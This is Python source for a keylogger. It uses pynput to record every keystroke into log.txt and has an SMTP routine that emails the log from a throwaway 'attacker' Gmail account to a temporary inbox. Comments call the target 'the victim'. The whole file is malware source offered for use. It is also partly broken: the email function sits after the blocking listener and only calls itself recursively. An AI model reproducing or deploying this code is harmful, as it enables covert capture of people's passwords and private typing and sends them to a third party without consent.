#Libraries
from types import BuiltinMethodType
import pynput
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

k_info = "log.txt"
path_to_file = " "
extend = "\\"

count = 0   #Count of characters after which the characters in list 'keys' would be appended to log.txt.
keys = []   #List of keys that are being captured.

attacker_email = ""     #An email of yours which has acctual no use to you.(prefarably gmail)
password = ""           #Password to the above email.
to_addr = ""            #Create a temp email to recieve the log files.

def press(key):     #Function for the action when a key is being pressed.
    global count, keys
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 25:
        count = 0
        write_to_file(keys)

def release(key):   #Function for the action when a key is being released.
    if key == Key.esc:
        return False

def write_to_file(keys):    #Function to write the captured characters to the 'log.txt' file and some if else to remove quoatations and spaces to get clearer view of what the victim is typing.
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif  k.find ("Key") == -1:
                f.write(k)

with Listener(on_press=press, on_release=release) as listener:  #Listener is a thread from pnyput library that allows us to monitor the keystrokes.
    listener.join()

def send_email(filename, attachment, to_addr): #Basic smtp setup to send email with attachments (Got this on geeksfor geeks).
    from_addr = attacker_email
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Logs"
    body = "Body"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p= MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, to_addr, text)
    s.quit()

    send_email(k_info, path_to_file+extend+k_info, to_addr)